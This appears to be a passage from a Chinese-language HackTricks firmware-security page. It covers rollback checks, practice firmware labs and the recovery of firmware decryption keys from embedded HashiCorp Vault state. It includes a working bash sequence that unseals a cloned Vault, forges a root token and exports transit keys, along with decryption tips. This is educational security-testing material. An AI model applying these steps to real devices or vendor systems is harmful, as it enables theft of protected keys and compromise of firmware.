* Slot 激活元数据是否与**已验证的 firmware digest/version 绑定**，还是 slot 在提升后仍可被修改？
* Slot 切换成功后，设备是否会被强制重启？还是同一会话中仍可调用后续的 update/erase routine？
* Userland 代码是否执行额外的合理性检查（例如允许的分区映射、型号）？
* *Partial* 或 *backup* update 流程是否复用了相同的验证逻辑？

> 💡  如果缺少上述任一项，该平台很可能容易受到 rollback 攻击。

## 用于练习的易受攻击 firmware

要练习在 firmware 中发现漏洞，可以从以下易受攻击的 firmware 项目入手。

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## 从嵌入式 KMS/Vault 状态中恢复 firmware 解密密钥

当 update 镜像将少量明文元数据与大型高熵数据块混合在一起时，应先进行容器初步分析，再尝试暴力破解：<sup>[[1]](#references)</sup>

- 使用 `hexdump`、`xxd`、`strings -tx`、`base64 -d` 和 `binwalk -E` 导出 header、offset 和行边界。
- `Salted__` 通常表示 OpenSSL `enc` 格式：接下来的 8 个字节是 salt，其余字节是 ciphertext。
- 若某个 Base64 字段解码后恰好为 `256` 字节，这是一个强烈线索，表明它可能是封装随机 firmware password/session key 的 RSA-2048 ciphertext。
- 同一文件中的分离式 PGP 数据通常只用于保护真实性；不要假定它是保密机制。

如果静态密钥搜索（`grep`、`strings`、PEM/PGP 搜索）没有结果，应逆向分析**实际解密流程**，而不只是搜索 private key：

- 反编译 updater / management binary，并追踪哪个组件读取加密数据块、哪个 helper/API 对其解封装，以及它请求的逻辑密钥名称。
- 在提取出的 root filesystem 中搜索 KMS 状态（`vault/`、`transit/`、`pkcs11`、`keystore`、`sealed-secrets`），以及 unit 文件和 init 脚本。
- 将明文形式的 `vault operator unseal ...`、恢复密钥、bootstrap token 或本地 KMS 自动解封脚本视为等同于 private-key material。

如果设备附带原始 Vault binary 和存储 backend，重放该环境通常比重新实现 Vault 内部机制更简单：

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

在克隆的 KMS 上获得 root 权限后：

- 仅在隔离的克隆环境中将 transit keys 设为可导出：`vault write transit/keys/<name>/config exportable=true`
- 导出 unwrap key：`vault read transit/export/encryption-key/<name>`
- 使用 KMS 所用的确切填充/哈希组合尝试恢复的 RSA key。PKCS#1 v1.5 解密失败以及默认 OAEP 解密失败，**并不能**证明 key 有误；许多基于 Vault 的流程使用 SHA-256 的 OAEP，而常见库默认使用 SHA-1。
- 如果 payload 以 `Salted__` 开头，请在尝试 AES-CBC 解密前，准确复现供应商的 OpenSSL KDF（`EVP_BytesToKey`，旧款设备通常使用 MD5）。

这将“加密固件”转化为一个更一般的问题：**恢复设备端的操作密钥，然后离线复现确切的 unwrap + KDF 参数**。

## 培训和认证

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [用 Claude 破解固件：资深级技能，初级级自主性](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [固件安全测试方法论](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [实用 IoT 黑客技术：攻击物联网的权威指南](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [利用废弃硬件中的零日漏洞——Trail of Bits 博客](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [一台价值 20 美元的智能设备如何让我访问你的家](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [现在你看见了 mi：现在你被 Pwn 了](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - 从充电口连接器攻击 Tesla Wall Connector - 第 2 部分：绕过防降级机制](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [让它闪烁：通过无线方式攻击 Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [在 QEMU 上运行 ROOT Tesla OS 第 2 部分：调试与修复](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [10] [Dell BIOS 密码：弱 XOR 加密可从 SPI Flash 中恢复密码（CVE-2026-40639）](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [11] [R3n5k1/dellpwn - Dell BIOS 密码恢复工具](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
